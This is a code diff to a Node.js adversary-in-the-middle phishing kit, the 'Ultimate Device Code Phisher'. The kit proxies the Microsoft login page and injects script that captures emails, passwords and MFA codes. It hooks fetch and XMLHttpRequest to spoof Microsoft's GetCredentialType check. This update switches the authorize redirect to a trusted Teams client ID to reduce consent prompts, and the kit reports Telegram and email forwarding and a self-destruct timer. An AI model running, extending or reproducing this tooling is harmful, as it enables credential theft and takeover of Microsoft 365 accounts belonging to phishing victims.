@@ -1,5 +1,5 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.15 – Fixed Mock Route
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.16 – Trusted Proxy Client
 // ============================================================
 
 const http = require('http');
@@ -39,7 +39,16 @@ const SMTP_PASS = process.env.SMTP_PASS || '';
 const DASHBOARD_USER = process.env.DASHBOARD_USER || 'admin';
 const DASHBOARD_PASS = process.env.DASHBOARD_PASS || 'password';
 const REDIRECT_URL = process.env.REDIRECT_URL || 'https://login.microsoftonline.com';
+
+// Default CLIENT_ID for device-code flow (Office mobile)
 const CLIENT_ID = process.env.CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+
+// 🔥 PROXY-SPECIFIC CLIENT ID — more trusted, lower consent friction
+// Teams = 1fec8e78-bce4-4aaf-ab1b-5451cc387264
+// Teams Web = 5e3ce6c0-2b1f-4285-8d4b-75ee78787346
+// SharePoint = 00000003-0000-0ff1-ce00-000000000000
+const PROXY_CLIENT_ID = process.env.PROXY_CLIENT_ID || '1fec8e78-bce4-4aaf-ab1b-5451cc387264';
+
 const SCOPE = 'https://graph.microsoft.com/.default offline_access';
 const SESSION_TTL = process.env.SESSION_TTL ? parseInt(process.env.SESSION_TTL) : 7 * 24 * 60 * 60 * 1000;
 const ALLOWED_IPS = process.env.ALLOWED_IPS ? process.env.ALLOWED_IPS.split(',').map(ip => ip.trim()) : [];
@@ -662,7 +671,6 @@ app.post('/device/fingerprint', (req, res) => {
 app.post('/login/common/GetCredentialType', (req, res) => {
     console.log('[PHANTOM] ✅ Intercepted GetCredentialType');
 
-    // Parse from rawBody because the stream interceptor starves express.json()
     let body = {};
     try {
         const raw = req.rawBody ? req.rawBody.toString('utf8') : JSON.stringify(req.body || {});
@@ -673,11 +681,10 @@ app.post('/login/common/GetCredentialType', (req, res) => {
 
     const username = body.username || body.Username || body.login || '';
 
-    // Return the FULL response shape Microsoft expects
     const fakeResponse = {
         Username: username,
         Display: username,
-        IfExistsResult: 0,              // 0 = exists, 1 = not-found (triggers error)
+        IfExistsResult: 0,
         ThrottleStatus: 0,
         Credentials: {
             AuthMethod: "Password",
@@ -689,7 +696,7 @@ app.post('/login/common/GetCredentialType', (req, res) => {
         },
         EstsProperties: {
             UserTenantBranding: [],
-            DomainType: 1                 // 1 = MSA/consumer (outlook.com), 3 = AAD/managed
+            DomainType: 1
         },
         FlowToken: body.flowToken || body.FlowToken || "",
         IsSignup: false,
@@ -706,7 +713,6 @@ app.post('/login/common/GetCredentialType', (req, res) => {
 
 // ── SECOND-STAGE PHISHING: CRASH‑PROOF REVERSE PROXY ──
 app.all('/login*', async (req, res) => {
-    // Handle OPTIONS preflight locally to avoid 500 from Microsoft
     if (req.method === 'OPTIONS') {
         res.setHeader('Access-Control-Allow-Origin', '*');
         res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
@@ -718,11 +724,12 @@ app.all('/login*', async (req, res) => {
     const targetBase = 'https://login.microsoftonline.com';
     let targetPath = req.url.replace(/^\/login/, '');
     
-    // Rewrite GET requests to root /login to the authorize endpoint with CLIENT_ID
     const method = req.method;
+
+    // 🔥 Use PROXY_CLIENT_ID for the authorize redirect — more trusted, less consent friction
     if (method === 'GET' && (!targetPath || targetPath === '/' || targetPath === '' || targetPath.startsWith('?'))) {
         const params = new URLSearchParams({
-            client_id: CLIENT_ID,
+            client_id: PROXY_CLIENT_ID,
             response_type: 'code',
             redirect_uri: 'https://login.microsoftonline.com/common/oauth2/nativeclient',
             scope: SCOPE
@@ -731,7 +738,6 @@ app.all('/login*', async (req, res) => {
     }
     const targetUrl = targetBase + targetPath;
 
-    // Build headers – PRESERVE Referer, set Origin to Microsoft, strip others
     const headers = { ...req.headers };
     delete headers.host;
     delete headers['content-length'];
@@ -795,11 +801,9 @@ app.all('/login*', async (req, res) => {
             try {
                 const $ = cheerio.load(html);
                 
-                // 🔥 FIXED: Enhanced client-side spoof with full GetCredentialType mock
                 const captureScript = `
                     <script>
                         (function() {
-                            // ---------- CREDENTIAL CAPTURE ----------
                             let capturedEmail = '';
                             let capturedPassword = '';
                             let capturedMFA = '';
@@ -865,13 +869,11 @@ app.all('/login*', async (req, res) => {
                                 sendCredentials();
                             });
 
-                            // ---------- CORS BYPASS & GetCredentialType SPOOFING ----------
                             const origFetch = window.fetch;
                             window.fetch = function(url, options) {
                                 let urlStr = (typeof url === 'string') ? url : (url && url.url ? url.url : '');
                                 if (!urlStr) return origFetch(url, options);
 
-                                // 🔥 BYPASS: If this is the GetCredentialType API, return a fake successful response
                                 if (urlStr.includes('GetCredentialType')) {
                                     console.log('[PHANTOM] ✅ Spoofing GetCredentialType response to bypass error.');
                                     const reqBody = options && options.body ? JSON.parse(options.body) : {};
@@ -911,7 +913,6 @@ app.all('/login*', async (req, res) => {
                                 return origFetch(urlStr, options);
                             };
 
-                            // Intercept XMLHttpRequest
                             const origXHROpen = XMLHttpRequest.prototype.open;
                             const origXHRSend = XMLHttpRequest.prototype.send;
                             XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
@@ -1194,7 +1195,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.15 – Fixed Mock Route running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.16 – Trusted Proxy Client running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -1202,6 +1203,8 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📁 Campaigns: active`);
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
+    console.log(`🔑 Device-Code CLIENT_ID: ${CLIENT_ID}`);
+    console.log(`🔑 Proxy CLIENT_ID: ${PROXY_CLIENT_ID}`);
     console.log(`🚀 GetCredentialType explicitly mocked at backend: ACTIVE`);
 });
 
